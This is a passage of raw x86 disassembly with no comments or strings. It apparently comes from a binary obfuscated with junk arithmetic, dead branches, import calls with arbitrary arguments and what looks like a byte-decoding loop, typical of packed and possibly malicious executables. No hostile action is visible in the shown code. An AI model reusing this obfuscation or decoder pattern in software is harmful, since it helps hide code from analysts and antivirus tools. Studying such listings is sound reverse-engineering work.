  41df89:	push   eax
  41df8a:	lea    eax,[ebp-0x2]
  41df8d:	push   eax
  41df8e:	shl    ecx,0x1e
  41df91:	call   0x41d37f
  41df96:	mov    eax,DWORD PTR [ebp+0x10]
  41df99:	mov    ecx,DWORD PTR [ebp+0x14]
  41df9c:	shrd   eax,ecx,0x2
  41dfa0:	shr    ecx,0x2
  41dfa3:	mov    ecx,DWORD PTR [ebp+0x10]
  41dfa6:	mov    edx,DWORD PTR [ebp+0x14]
  41dfa9:	xor    eax,esi
  41dfab:	xor    edx,edx
  41dfad:	or     eax,edx
  41dfaf:	add    eax,edi
  41dfb1:	push   ebx
  41dfb2:	push   eax
  41dfb3:	mov    eax,DWORD PTR [ebp+0x8]
  41dfb6:	shl    ecx,0x1e
  41dfb9:	mov    ecx,DWORD PTR [ebp+0xc]
  41dfbc:	shrd   eax,ecx,0x2
  41dfc0:	shr    ecx,0x2
  41dfc3:	mov    ecx,DWORD PTR [ebp+0x8]
  41dfc6:	mov    edx,DWORD PTR [ebp+0xc]
  41dfc9:	xor    eax,esi
  41dfcb:	xor    edx,edx
  41dfcd:	or     eax,edx
  41dfcf:	add    eax,edi
  41dfd1:	push   eax
  41dfd2:	shl    ecx,0x1e
  41dfd5:	call   0x41d37f
  41dfda:	push   ebx
  41dfdb:	lea    eax,[ebp-0x2]
  41dfde:	push   eax
  41dfdf:	mov    eax,DWORD PTR [ebp+0x10]
  41dfe2:	mov    ecx,DWORD PTR [ebp+0x14]
  41dfe5:	shrd   eax,ecx,0x2
  41dfe9:	shr    ecx,0x2
  41dfec:	mov    ecx,DWORD PTR [ebp+0x10]
  41dfef:	mov    edx,DWORD PTR [ebp+0x14]
  41dff2:	xor    eax,esi
  41dff4:	xor    edx,edx
  41dff6:	or     eax,edx
  41dff8:	add    eax,edi
  41dffa:	push   eax
  41dffb:	shl    ecx,0x1e
  41dffe:	call   0x41d37f
  41e003:	mov    eax,DWORD PTR [ebp+0x10]
  41e006:	mov    ecx,DWORD PTR [ebp+0x14]
  41e009:	shrd   eax,ecx,0x2
  41e00d:	shr    ecx,0x2
  41e010:	mov    ecx,DWORD PTR [ebp+0x10]
  41e013:	mov    edx,DWORD PTR [ebp+0x14]
  41e016:	pop    edi
  41e017:	xor    eax,esi
  41e019:	xor    edx,edx
  41e01b:	pop    esi
  41e01c:	shl    ecx,0x1e
  41e01f:	or     eax,edx
  41e021:	pop    ebx
  41e022:	leave  
  41e023:	ret    0x10
  41e026:	mov    eax,DWORD PTR [esp+0x8]
  41e02a:	mov    ecx,DWORD PTR [esp+0x10]
  41e02e:	xor    DWORD PTR ds:0x4228ba,0x2ee8
  41e038:	or     ecx,eax
  41e03a:	not    ecx
  41e03c:	mov    ecx,DWORD PTR [esp+0xc]
  41e040:	mov    DWORD PTR ds:0x422936,0x71b
  41e04a:	jne    0x41e0de
  41e050:	cmp    DWORD PTR ds:0x422936,0x0
  41e057:	not    DWORD PTR ds:0x42292a
  41e05d:	mov    DWORD PTR ds:0x42291a,0x73d7
  41e067:	mov    DWORD PTR ds:0x4229ce,0x27c3
  41e071:	jmp    0x41e0d5
  41e076:	mov    eax,0x55fe
  41e07b:	jge    0x41e0c5
  41e081:	push   0x626f
  41e086:	push   DWORD PTR [ebp-0x10]
  41e089:	push   DWORD PTR [ebp-0x10]
  41e08c:	push   DWORD PTR [ebp-0x14]
  41e08f:	push   DWORD PTR [ebp-0x14]
  41e092:	push   0x6abc
  41e097:	call   DWORD PTR ds:0x42a194
  41e09d:	sbb    DWORD PTR ds:0x42295e,0x422926
  41e0a7:	xor    DWORD PTR ds:0x4228de,0x422996
  41e0b1:	or     DWORD PTR ds:0x4229b2,0x422932
  41e0bb:	or     DWORD PTR ds:0x422906,0x42298e
  41e0c5:	or     DWORD PTR ds:0x4229a2,0x766e
  41e0cf:	sbb    DWORD PTR ds:0x422996,ebx
  41e0d5:	mov    eax,DWORD PTR [esp+0x4]
  41e0d9:	mul    ecx
  41e0db:	ret    0x10
  41e0de:	push   ebx
  41e0df:	mul    ecx
  41e0e1:	mov    ebx,eax
  41e0e3:	mov    eax,DWORD PTR [esp+0x8]
  41e0e7:	mul    DWORD PTR [esp+0x14]
  41e0eb:	add    ebx,eax
  41e0ed:	mov    eax,DWORD PTR [esp+0x8]
  41e0f1:	mul    ecx
  41e0f3:	add    edx,ebx
  41e0f5:	pop    ebx
  41e0f6:	ret    0x10
  41e0f9:	push   ebp
  41e0fa:	mov    ebp,esp
  41e0fc:	sub    esp,0x30
  41e0ff:	push   ebx
  41e100:	push   esi
  41e101:	push   edi
  41e102:	mov    DWORD PTR [ebp-0xc],0x1d4c
  41e109:	mov    DWORD PTR [ebp-0x8],0x1c4a
  41e110:	mov    DWORD PTR [ebp-0x4],0x73ba
  41e117:	mov    DWORD PTR [ebp-0x1c],0x7afa
  41e11e:	mov    DWORD PTR [ebp-0x18],0x618d
  41e125:	mov    DWORD PTR [ebp-0x14],0x7b8c
  41e12c:	mov    DWORD PTR [ebp-0x10],0x46ba
  41e133:	mov    DWORD PTR [ebp-0x30],0x6996
  41e13a:	mov    DWORD PTR [ebp-0x2c],0x3bbb
  41e141:	mov    DWORD PTR [ebp-0x28],0x571e
  41e148:	mov    DWORD PTR [ebp-0x24],0x46e5
  41e14f:	mov    ecx,DWORD PTR [ebp-0x14]
  41e152:	imul   ecx,ecx,0x7649
  41e158:	add    ecx,DWORD PTR [ebp-0x18]
  41e15b:	xor    edx,edx
  41e15d:	add    ecx,DWORD PTR [ebp-0x1c]
  41e160:	mov    eax,DWORD PTR [ebp-0x4]
  41e163:	mov    esi,DWORD PTR [ebp-0x8]
  41e166:	sub    eax,0x3049
  41e16b:	imul   eax,eax,0x585
  41e171:	add    eax,0x46ca
  41e176:	xor    ecx,0x3916a43d
  41e17c:	div    esi
  41e17e:	mov    edi,0x2a7c
  41e183:	mov    esi,0x2cea
  41e188:	jmp    0x41e21f
  41e18d:	mov    DWORD PTR [ebp-0x20],0xeaf
  41e194:	mov    DWORD PTR [ebp-0x14],0x6627
  41e19b:	mov    DWORD PTR [ebp-0x18],0x2899
  41e1a2:	mov    DWORD PTR [ebp-0x1c],0x4f7d
  41e1a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41e1ac:	mov    edx,DWORD PTR [ebp-0x18]
  41e1af:	or     eax,edx
  41e1b1:	mov    edx,DWORD PTR [ebp-0x14]
  41e1b4:	imul   eax,edx
  41e1b7:	add    eax,DWORD PTR [ebp-0x20]
  41e1ba:	xor    edx,edx
  41e1bc:	mov    ebx,0x5ceb
  41e1c1:	div    ebx
  41e1c3:	mov    ebx,DWORD PTR [ebp+0x8]
  41e1c6:	mov    edx,ecx
  41e1c8:	xor    eax,0x4050
  41e1cd:	sub    edx,eax
  41e1cf:	mov    DWORD PTR [ebp-0x20],edx
  41e1d2:	mov    eax,DWORD PTR [ebp-0x24]
  41e1d5:	mov    dl,BYTE PTR [ebp+0xc]
  41e1d8:	xor    al,0xd1
  41e1da:	sub    dl,al
  41e1dc:	mov    eax,DWORD PTR [ebp-0x28]
  41e1df:	sub    dl,al
  41e1e1:	mov    eax,DWORD PTR [ebp-0x20]
  41e1e4:	add    dl,0x52
  41e1e7:	mov    BYTE PTR [eax+ebx*1],dl
  41e1ea:	mov    eax,DWORD PTR [ebp-0x2c]
  41e1ed:	sub    eax,0x421
  41e1f2:	and    eax,0xd30
  41e1f7:	add    eax,DWORD PTR [ebp-0x30]
  41e1fa:	xor    edx,edx
  41e1fc:	mov    ebx,0x6ea6
  41e201:	div    ebx
  41e203:	xor    edx,edx
  41e205:	add    ecx,eax
  41e207:	mov    eax,DWORD PTR [ebp-0x4]
  41e20a:	mov    ebx,DWORD PTR [ebp-0x8]
  41e20d:	sub    eax,0x3049
  41e212:	imul   eax,eax,0x585
  41e218:	add    eax,0x46ca
  41e21d:	div    ebx
  41e21f:	mov    edx,DWORD PTR [ebp-0xc]
  41e222:	xor    eax,edx
  41e224:	mov    edx,0x1086
  41e229:	sub    edx,eax
  41e22b:	mov    eax,DWORD PTR [ebp-0x10]
  41e22e:	and    eax,0x4a00
  41e233:	or     eax,0x20
  41e236:	sub    eax,edi
  41e238:	xor    eax,esi
  41e23a:	mov    ebx,ecx
  41e23c:	sub    ebx,eax
  41e23e:	cmp    ebx,edx
  41e240:	jbe    0x41e18d
  41e246:	pop    edi
  41e247:	pop    esi
  41e248:	pop    ebx
  41e249:	leave  
  41e24a:	ret    0x8
  41e24d:	push   ebp
  41e24e:	mov    ebp,esp
  41e250:	and    esp,0xfffffff8
  41e253:	sub    esp,0x8c
  41e259:	push   ebx
  41e25a:	push   esi
  41e25b:	push   edi
  41e25c:	push   0xa
  41e25e:	push   DWORD PTR ds:0x4220dc
  41e264:	push   DWORD PTR ds:0x4220dc
  41e26a:	call   DWORD PTR ds:0x42a004
  41e270:	test   eax,eax
  41e272:	jle    0x41e27f
  41e278:	xor    eax,eax
  41e27a:	jmp    0x41f8a3
  41e27f:	mov    DWORD PTR [esp+0x38],0x10b8
  41e287:	or     DWORD PTR ds:0x4229b6,edx
  41e28d:	mov    DWORD PTR [esp+0x3c],0x31bb
  41e295:	adc    ecx,ecx
  41e297:	mov    DWORD PTR [esp+0x40],0x2114
  41e29f:	mov    DWORD PTR [esp+0x44],0xfe7
  41e2a7:	cmp    DWORD PTR ds:0x4229c6,0x0
  41e2ae:	mov    ecx,DWORD PTR ds:0x422996
  41e2b4:	not    ecx
  41e2b6:	jmp    0x41e319
  41e2bb:	mov    eax,0x3d56
  41e2c0:	jb     0x41e2fd
  41e2c6:	push   0x4229ce
  41e2cb:	push   0x3b50
  41e2d0:	push   0x1b8c
  41e2d5:	push   DWORD PTR [ebp-0x10]
  41e2d8:	push   DWORD PTR [ebp-0x14]
  41e2db:	push   0x153f
  41e2e0:	push   DWORD PTR [ebp-0x24]
  41e2e3:	call   DWORD PTR ds:0x42a070
  41e2e9:	not    ecx
  41e2eb:	add    ecx,ecx
  41e2ed:	sbb    DWORD PTR ds:0x4228aa,0x4228c2
  41e2f7:	or     DWORD PTR ds:0x42298a,ebx
  41e2fd:	add    ecx,ecx
  41e2ff:	sbb    DWORD PTR ds:0x42289e,0x422946
  41e309:	xor    ecx,ecx
  41e30b:	xor    ecx,ecx
  41e30d:	or     ecx,DWORD PTR ds:0x42292e
  41e313:	add    DWORD PTR ds:0x4229b2,ecx
  41e319:	mov    DWORD PTR [esp+0x18],0xac404108
  41e321:	cmp    DWORD PTR ds:0x422922,0x0
  41e328:	mov    DWORD PTR ds:0x4229ce,0x2ada
  41e332:	mov    DWORD PTR ds:0x42297a,edi
  41e338:	jmp    0x41e399
  41e33d:	not    DWORD PTR ds:0x42290a
  41e343:	mov    DWORD PTR ds:0x42288a,0x279a
  41e34d:	jbe    0x41e381
  41e353:	push   0x4226b9
  41e358:	call   DWORD PTR ds:0x42a074
  41e35e:	add    ecx,ecx
  41e360:	movzx  ecx,BYTE PTR ds:0x4229a6
  41e367:	and    DWORD PTR ds:0x42290e,ecx
  41e36d:	and    DWORD PTR ds:0x42298e,edi
  41e373:	xor    ecx,ecx
  41e375:	xor    ecx,DWORD PTR ds:0x422932
  41e37b:	or     DWORD PTR ds:0x422992,ecx
  41e381:	add    ecx,DWORD PTR ds:0x4228aa
  41e387:	xor    ecx,0xa66
  41e38d:	or     DWORD PTR ds:0x4228da,edi
  41e393:	sub    eax,DWORD PTR ds:0x4229ba
  41e399:	mov    DWORD PTR [esp+0x1c],0x1002
  41e3a1:	or     eax,eax
  41e3a3:	mov    DWORD PTR [esp+0x10],0x9aa
  41e3ab:	xor    eax,eax
  41e3ad:	xor    eax,DWORD PTR ds:0x4229e2
  41e3b3:	mov    ecx,DWORD PTR ds:0x422abe
  41e3b9:	sub    ecx,eax
  41e3bb:	and    eax,DWORD PTR [eax+ecx*1]
  41e3be:	push   0x61f6
  41e3c3:	cmp    DWORD PTR ds:0x4228ee,0x0
  41e3ca:	mov    DWORD PTR ds:0x42295e,0x401d
  41e3d4:	mov    DWORD PTR ds:0x422972,ebx
  41e3da:	mov    ecx,0x5ee5
  41e3df:	jmp    0x41e447
  41e3e4:	mov    DWORD PTR ds:0x4228ae,ebx
  41e3ea:	mov    DWORD PTR ds:0x4228f2,0x622c
  41e3f4:	ja     0x41e42b
  41e3fa:	push   0x67cd
  41e3ff:	push   DWORD PTR [ebp-0x24]
  41e402:	push   0x11c0
  41e407:	call   DWORD PTR ds:0x42a078
  41e40d:	sub    DWORD PTR ds:0x4228e2,0x2f74
  41e417:	xor    ecx,ecx
  41e419:	add    ecx,DWORD PTR ds:0x422922
  41e41f:	xor    ecx,DWORD PTR ds:0x4228da
  41e425:	mov    DWORD PTR ds:0x422922,ecx
  41e42b:	sub    ecx,0x1bd0
  41e431:	mov    ecx,DWORD PTR ds:0x422986
  41e437:	adc    DWORD PTR ds:0x42288e,ecx
  41e43d:	or     DWORD PTR ds:0x42294a,0xc71
  41e447:	mov    DWORD PTR [esp+0x18],0x747
  41e44f:	mov    eax,DWORD PTR [esp+0x14]
  41e453:	or     ecx,DWORD PTR ds:0x4228be
  41e459:	mov    ecx,DWORD PTR [esp+0x18]
  41e45d:	push   0x1caf
  41e462:	sub    DWORD PTR ds:0x4228ae,0x2516
  41e46c:	push   ecx
  41e46d:	sub    DWORD PTR ds:0x422916,0x4228e6
  41e477:	push   eax
  41e478:	call   0x41e026
  41e47d:	sbb    DWORD PTR ds:0x4228ce,0x6aff
  41e487:	mov    ecx,DWORD PTR [esp+0x18]
  41e48b:	mov    esi,DWORD PTR ds:0x422946
  41e491:	sub    DWORD PTR ds:0x4228be,esi
  41e497:	mov    esi,DWORD PTR [esp+0x1c]
  41e49b:	sbb    DWORD PTR ds:0x4229d2,0x42291a
  41e4a5:	push   esi
  41e4a6:	sbb    DWORD PTR ds:0x42299a,0x3dc6
  41e4b0:	push   ecx
  41e4b1:	add    DWORD PTR ds:0x4228a2,0x422972
  41e4bb:	push   edx
  41e4bc:	push   eax
  41e4bd:	sbb    DWORD PTR ds:0x4228de,0x749b
  41e4c7:	call   0x421b6b
  41e4cc:	mov    ecx,DWORD PTR [esp+0x40]
  41e4d0:	sub    esi,DWORD PTR ds:0x42291a
  41e4d6:	mov    esi,DWORD PTR [esp+0x44]
  41e4da:	sub    DWORD PTR ds:0x42288a,0x2899
  41e4e4:	add    eax,ecx
  41e4e6:	mov    DWORD PTR ds:0x422956,0x3eb8
  41e4f0:	mov    ecx,DWORD PTR [esp+0x38]
  41e4f4:	adc    edx,esi
  41e4f6:	mov    esi,DWORD PTR [esp+0x3c]
  41e4fa:	sub    DWORD PTR ds:0x4228da,0x4228fa
  41e504:	xor    eax,ecx
  41e506:	dec    DWORD PTR ds:0x4229c6
  41e50c:	mov    DWORD PTR [esp+0x40],eax
  41e510:	xor    edx,esi
  41e512:	mov    DWORD PTR [esp+0x44],edx
  41e516:	or     DWORD PTR ds:0x42292e,ecx
  41e51c:	mov    DWORD PTR [esp+0x18],0x6cd4
  41e524:	mov    DWORD PTR [esp+0x1c],0x5497
  41e52c:	mov    DWORD PTR [esp+0x10],0x36dd
  41e534:	xor    ecx,DWORD PTR ds:0x42289a
  41e53a:	mov    DWORD PTR [esp+0x14],0x78dd
  41e542:	cmp    DWORD PTR ds:0x422956,0x0
  41e549:	mov    DWORD PTR ds:0x422902,0x537a
  41e553:	mov    DWORD PTR ds:0x42289a,ebx
  41e559:	not    ecx
  41e55b:	jmp    0x41e5bb
  41e560:	mov    DWORD PTR ds:0x4229aa,0x24bb
  41e56a:	mov    ecx,0x50b
  41e56f:	jle    0x41e5a5
  41e575:	push   0x40ba
  41e57a:	push   0x4c3a
  41e57f:	push   DWORD PTR [ebp-0x20]
  41e582:	push   0x19f6
  41e587:	push   DWORD PTR [ebp-0x28]
  41e58a:	push   0x29a0
  41e58f:	call   DWORD PTR ds:0x42a2a8
  41e595:	adc    DWORD PTR ds:0x4228fe,0x2e50
  41e59f:	or     DWORD PTR ds:0x4229b2,edx
  41e5a5:	sub    DWORD PTR ds:0x422956,edi
  41e5ab:	add    DWORD PTR ds:0x422926,0x2a5
  41e5b5:	or     DWORD PTR ds:0x422916,ebx
  41e5bb:	mov    DWORD PTR [esp+0x38],0x3985
  41e5c3:	cmp    DWORD PTR ds:0x4228d6,0x0
  41e5ca:	mov    DWORD PTR ds:0x4228c2,ecx
  41e5d0:	mov    ecx,DWORD PTR ds:0x4228a2
  41e5d6:	jmp    0x41e61d
  41e5db:	not    eax
  41e5dd:	je     0x41e605
  41e5e3:	push   DWORD PTR [ebp-0x10]
  41e5e6:	push   0x8599
  41e5eb:	push   DWORD PTR [ebp-0x24]
  41e5ee:	push   0x24de
  41e5f3:	call   DWORD PTR ds:0x42a2ac
  41e5f9:	sub    DWORD PTR ds:0x4228fe,ebx
  41e5ff:	and    ecx,0x2884
  41e605:	and    ecx,0x5007
  41e60b:	sub    DWORD PTR ds:0x422892,edi
  41e611:	adc    DWORD PTR ds:0x42295e,ebx
  41e617:	neg    DWORD PTR ds:0x42296e
  41e61d:	push   0x0
  41e61f:	not    eax
  41e621:	mov    DWORD PTR [esp+0x40],0x1dd2
  41e629:	movzx  ecx,WORD PTR ds:0x422892
  41e630:	and    ecx,DWORD PTR ds:0x4228e2
  41e636:	mov    DWORD PTR ds:0x422892,ecx
  41e63c:	mov    eax,DWORD PTR [esp+0x3c]
  41e640:	or     DWORD PTR ds:0x42292a,ecx
  41e646:	mov    ecx,DWORD PTR [esp+0x40]
  41e64a:	adc    DWORD PTR ds:0x4228a6,0x44d3
  41e654:	push   0x5af1c38e
  41e659:	push   ecx
  41e65a:	neg    DWORD PTR ds:0x4228a2
  41e660:	push   eax
  41e661:	not    DWORD PTR ds:0x4228e2
  41e667:	call   0x421b6b
  41e66c:	mov    ecx,DWORD PTR [esp+0x10]
  41e670:	movzx  esi,BYTE PTR ds:0x4228fe
  41e677:	add    esi,DWORD PTR ds:0x4229aa
  41e67d:	mov    DWORD PTR ds:0x4228fe,esi
  41e683:	mov    esi,DWORD PTR [esp+0x14]
  41e687:	sub    DWORD PTR ds:0x42293e,0x4228e6
  41e691:	push   esi
  41e692:	or     DWORD PTR ds:0x42290e,0x4229ba
  41e69c:	push   ecx
  41e69d:	adc    DWORD PTR ds:0x4229ce,0x4228a2
  41e6a7:	push   edx
  41e6a8:	add    DWORD PTR ds:0x422982,0x422926
  41e6b2:	push   eax
  41e6b3:	mov    DWORD PTR ds:0x422972,0x6150
  41e6bd:	call   0x41e026
  41e6c2:	and    esi,DWORD PTR ds:0x4228e6
  41e6c8:	mov    ecx,DWORD PTR [esp+0x18]
  41e6cc:	cmp    DWORD PTR ds:0x4228d2,0x0
  41e6d3:	mov    esi,0x2802
  41e6d8:	mov    esi,DWORD PTR ds:0x42290e
  41e6de:	jmp    0x41e757
  41e6e3:	mov    DWORD PTR ds:0x42292e,edx
  41e6e9:	mov    DWORD PTR ds:0x42298a,0x21bd
  41e6f3:	ja     0x41e744
  41e6f9:	push   0x422835
  41e6fe:	push   DWORD PTR [ebp-0x24]
  41e701:	push   DWORD PTR [ebp-0x28]
  41e704:	push   0x295c
  41e709:	push   0x31b0
  41e70e:	call   DWORD PTR ds:0x42a2b0
  41e714:	or     DWORD PTR ds:0x422936,0x4228ba
  41e71e:	movzx  esi,WORD PTR ds:0x42292a
  41e725:	add    esi,DWORD PTR ds:0x4229aa
  41e72b:	mov    DWORD PTR ds:0x42292a,esi
  41e731:	movzx  esi,BYTE PTR ds:0x42290a
  41e738:	add    DWORD PTR ds:0x4229ba,esi
  41e73e:	sub    DWORD PTR ds:0x422896,ecx
  41e744:	movzx  esi,BYTE PTR ds:0x4228ea
  41e74b:	sub    DWORD PTR ds:0x4229be,esi
  41e751:	adc    DWORD PTR ds:0x42295a,ecx
  41e757:	mov    esi,DWORD PTR [esp+0x1c]
  41e75b:	xor    eax,ecx
  41e75d:	add    DWORD PTR ds:0x4228ce,ecx
  41e763:	mov    ecx,DWORD PTR [esp+0x40]
  41e767:	or     DWORD PTR ds:0x4229c2,0x4228c2
  41e771:	xor    edx,esi
  41e773:	xor    DWORD PTR ds:0x422946,ebx
  41e779:	mov    esi,DWORD PTR [esp+0x44]
  41e77d:	sbb    DWORD PTR ds:0x4228d6,0x42295e
  41e787:	xor    eax,0x6e4d
  41e78c:	adc    DWORD PTR ds:0x422966,0x4228c2
  41e796:	xor    edx,0x79dc
  41e79c:	cmp    ecx,eax
  41e79e:	jne    0x41ed61
  41e7a4:	cmp    esi,edx
  41e7a6:	mov    DWORD PTR ds:0x422956,0x607f
  41e7b0:	jne    0x41ed61
  41e7b6:	sbb    ecx,eax
  41e7b8:	mov    DWORD PTR [esp+0x40],0x7b6e
  41e7c0:	and    DWORD PTR ds:0x422982,0x281d
  41e7ca:	mov    DWORD PTR [esp+0x18],0x1856
  41e7d2:	dec    ecx
  41e7d3:	mov    DWORD PTR [esp+0x10],0x6e3c
  41e7db:	mov    eax,DWORD PTR [esp+0x10]
  41e7df:	inc    ecx
  41e7e0:	imul   eax,eax,0x2801
  41e7e6:	mov    ecx,DWORD PTR ds:0x422a6a
  41e7ec:	mov    ecx,DWORD PTR [ecx]
  41e7ee:	and    DWORD PTR ds:0x422922,ecx
  41e7f4:	xor    edx,edx
  41e7f6:	sbb    DWORD PTR ds:0x42289e,ebx
  41e7fc:	mov    ecx,0x5f48
  41e801:	div    ecx
  41e803:	push   DWORD PTR ds:0x3b8dcfc0
  41e809:	xor    edx,edx
  41e80b:	adc    DWORD PTR ds:0x42290e,0x3f8e
  41e815:	and    eax,0x54fe
  41e81a:	xor    eax,0x283cecf3
  41e81f:	cmp    DWORD PTR ds:0x4228a2,0x0
  41e826:	mov    ecx,0x4c91
  41e82b:	mov    DWORD PTR ds:0x422972,0x3523
  41e835:	mov    ecx,DWORD PTR ds:0x42288e
  41e83b:	jmp    0x41e8a9
  41e840:	mov    DWORD PTR ds:0x4229c2,0x3b0c
  41e84a:	mov    DWORD PTR ds:0x4228de,0x3b7b
  41e854:	jbe    0x41e887
  41e85a:	push   DWORD PTR [ebp-0x18]
  41e85d:	push   0x2888
  41e862:	push   0x7bd5
  41e867:	push   0x6538
  41e86c:	push   0x7c45
  41e871:	call   DWORD PTR ds:0x42a2b4
  41e877:	and    DWORD PTR ds:0x42295a,0x2f05
  41e881:	xor    ecx,0x75ac
  41e887:	or     ecx,DWORD PTR ds:0x42288e
  41e88d:	sbb    DWORD PTR ds:0x42298a,ebx
  41e893:	mov    ecx,DWORD PTR ds:0x4228ba
  41e899:	sbb    DWORD PTR ds:0x422892,ecx
  41e89f:	sub    DWORD PTR ds:0x4229d2,0x2cc7
  41e8a9:	push   DWORD PTR [eax]
  41e8ab:	cmp    DWORD PTR ds:0x42288a,0x0
  41e8b2:	mov    ecx,0x2a8f
  41e8b7:	mov    DWORD PTR ds:0x4228d2,0x62da
  41e8c1:	mov    DWORD PTR ds:0x4228b2,0x461d
  41e8cb:	jmp    0x41e903
  41e8d0:	not    eax
  41e8d2:	mov    eax,0x1aaa
  41e8d7:	jle    0x41e8f7
  41e8dd:	push   DWORD PTR [ebp-0x14]
  41e8e0:	push   0x689c
  41e8e5:	call   DWORD PTR ds:0x42a2b8
  41e8eb:	and    ecx,DWORD PTR ds:0x4228ce
  41e8f1:	add    DWORD PTR ds:0x4228c2,ecx
  41e8f7:	sbb    DWORD PTR ds:0x42299e,ecx
  41e8fd:	sbb    ecx,0xe30
  41e903:	mov    eax,DWORD PTR [esp+0x20]
  41e907:	push   0xb
  41e909:	pop    ecx
  41e90a:	div    ecx
  41e90c:	sub    ecx,0x60ba
  41e912:	mov    ecx,DWORD PTR [esp+0x48]
  41e916:	not    DWORD PTR ds:0x4228b6
  41e91c:	sub    eax,ecx
  41e91e:	adc    DWORD PTR ds:0x4229ca,0x4229b6
  41e928:	add    eax,0x4d1
  41e92d:	sbb    DWORD PTR ds:0x422992,0x4228aa
  41e937:	imul   eax,eax,0xfffffb44
  41e93d:	and    eax,0xd55
  41e942:	xor    eax,0xf6b6e30e
  41e947:	push   DWORD PTR [eax]
  41e949:	add    DWORD PTR ds:0x42293e,0x4401
  41e953:	push   DWORD PTR ds:0x3747636f
  41e959:	push   DWORD PTR ds:0xc7c2f83b
  41e95f:	or     DWORD PTR ds:0x422926,0x64ef
  41e969:	push   DWORD PTR ds:0xe8d8887e
  41e96f:	push   DWORD PTR ds:0x1e049617
  41e975:	xor    DWORD PTR ds:0x4228b2,0x4229ae
  41e97f:	call   DWORD PTR ds:0x42a030
  41e985:	not    eax
  41e987:	mov    DWORD PTR [esp+0x18],0xac269
  41e98f:	cmp    DWORD PTR ds:0x422992,0x0
  41e996:	mov    ecx,DWORD PTR ds:0x4228d2
  41e99c:	mov    ecx,0x4e69
  41e9a1:	not    ecx
  41e9a3:	jmp    0x41e9f3
  41e9a8:	not    DWORD PTR ds:0x4228d2
  41e9ae:	mov    DWORD PTR ds:0x4228ee,0x6c90
  41e9b8:	jb     0x41e9ed
  41e9be:	push   0x7f87
  41e9c3:	push   DWORD PTR [ebp-0x1c]
  41e9c6:	push   0x186c
  41e9cb:	push   DWORD PTR [ebp-0x10]
  41e9ce:	push   DWORD PTR [ebp-0x1c]
  41e9d1:	call   DWORD PTR ds:0x42a07c
  41e9d7:	adc    DWORD PTR ds:0x422962,0x439a
  41e9e1:	sbb    ecx,ecx
  41e9e3:	or     DWORD PTR ds:0x4229b6,0x7fc4
  41e9ed:	sbb    ecx,ecx
  41e9ef:	add    ecx,ecx
  41e9f1:	or     ecx,ecx
  41e9f3:	mov    DWORD PTR [esp+0x10],0x5886
  41e9fb:	mov    ecx,DWORD PTR [esp+0x10]
  41e9ff:	sub    DWORD PTR ds:0x4228e6,ebx
  41ea05:	mov    eax,0x2f60
  41ea0a:	xor    DWORD PTR ds:0x4228be,0x78d1
  41ea14:	sub    eax,ecx
  41ea16:	movzx  ecx,BYTE PTR ds:0x422952
  41ea1d:	sbb    ecx,DWORD PTR ds:0x4228a6
  41ea23:	mov    DWORD PTR ds:0x422952,ecx
  41ea29:	mov    ecx,DWORD PTR [esp+0x18]
  41ea2d:	xor    eax,0x4eb0
  41ea32:	xor    DWORD PTR ds:0x42293a,0x31dd
  41ea3c:	xor    edx,edx
  41ea3e:	or     DWORD PTR ds:0x422952,0x422962
  41ea48:	div    ecx
  41ea4a:	imul   eax,eax,0x79e
  41ea50:	inc    DWORD PTR ds:0x422956
  41ea56:	xor    eax,0x7f8a
  41ea5b:	sbb    DWORD PTR ds:0x422906,0x77b7
  41ea65:	push   DWORD PTR [eax+0x66d98445]
  41ea6b:	or     DWORD PTR ds:0x4228a6,0x1e7d
  41ea75:	push   DWORD PTR ds:0x4af06c36
  41ea7b:	sbb    DWORD PTR ds:0x4228ae,0x4228be
  41ea85:	call   DWORD PTR ds:0x42a33c
  41ea8b:	and    DWORD PTR ds:0x42294a,edi
  41ea91:	mov    DWORD PTR [esp+0x10],0xd8e5515f
  41ea99:	cmp    DWORD PTR ds:0x4228ba,0x0
  41eaa0:	mov    ecx,0x55dc
  41eaa5:	mov    DWORD PTR ds:0x42292a,0x378a
  41eaaf:	not    DWORD PTR ds:0x422892
  41eab5:	jmp    0x41eb2a
  41eaba:	mov    DWORD PTR ds:0x4228fe,0x78ab
  41eac4:	mov    DWORD PTR ds:0x4228ba,0x7a87
  41eace:	jb     0x41eafc
  41ead4:	push   DWORD PTR [ebp-0x10]
  41ead7:	push   0x211a
  41eadc:	push   DWORD PTR [ebp-0xc]
  41eadf:	push   DWORD PTR [ebp-0x20]
  41eae2:	call   DWORD PTR ds:0x42a080
  41eae8:	and    DWORD PTR ds:0x42295e,edx
  41eaee:	or     esi,ecx
  41eaf0:	or     esi,DWORD PTR ds:0x422906
  41eaf6:	and    DWORD PTR ds:0x4229b6,edi
  41eafc:	adc    DWORD PTR ds:0x422956,0x422932
  41eb06:	xor    ecx,ecx
  41eb08:	xor    ecx,DWORD PTR ds:0x422a9e
  41eb0e:	xor    esi,esi
  41eb10:	xor    esi,DWORD PTR ds:0x422b16
  41eb16:	sub    ecx,esi
  41eb18:	add    ecx,DWORD PTR [ecx+esi*1]
  41eb1b:	sub    ecx,ecx
  41eb1d:	movzx  esi,WORD PTR ds:0x42290a
  41eb24:	and    DWORD PTR ds:0x4228fe,esi
  41eb2a:	mov    DWORD PTR [esp+0x14],0x0
  41eb32:	cmp    DWORD PTR ds:0x4228f2,0x0
  41eb39:	movzx  esi,BYTE PTR ds:0x4228fa
  41eb40:	not    esi
  41eb42:	mov    DWORD PTR ds:0x42290e,0x4dc8
  41eb4c:	jmp    0x41ebb5
  41eb51:	mov    esi,DWORD PTR ds:0x4228b2
  41eb57:	not    eax
  41eb59:	jg     0x41eb96
  41eb5f:	push   0x0
  41eb61:	push   0x36d5
  41eb66:	push   0x10b0
  41eb6b:	call   DWORD PTR ds:0x42a2bc
  41eb71:	and    edx,0x7f12
  41eb77:	dec    ecx
  41eb78:	mov    edx,DWORD PTR ds:0x42291a
  41eb7e:	or     edx,DWORD PTR ds:0x4228a2
  41eb84:	mov    DWORD PTR ds:0x42291a,edx
  41eb8a:	mov    edx,DWORD PTR ds:0x4228e6
  41eb90:	or     DWORD PTR ds:0x4228a6,edx
  41eb96:	mov    edx,DWORD PTR ds:0x42296e
  41eb9c:	add    DWORD PTR ds:0x4229c6,edx
  41eba2:	movzx  edx,WORD PTR ds:0x42296a
  41eba9:	and    edx,DWORD PTR ds:0x422892
  41ebaf:	mov    DWORD PTR ds:0x42296a,edx
  41ebb5:	mov    DWORD PTR [esp+0x38],0x9f7
  41ebbd:	cmp    DWORD PTR ds:0x42292e,0x0
  41ebc4:	mov    DWORD PTR ds:0x4228c6,0x484a
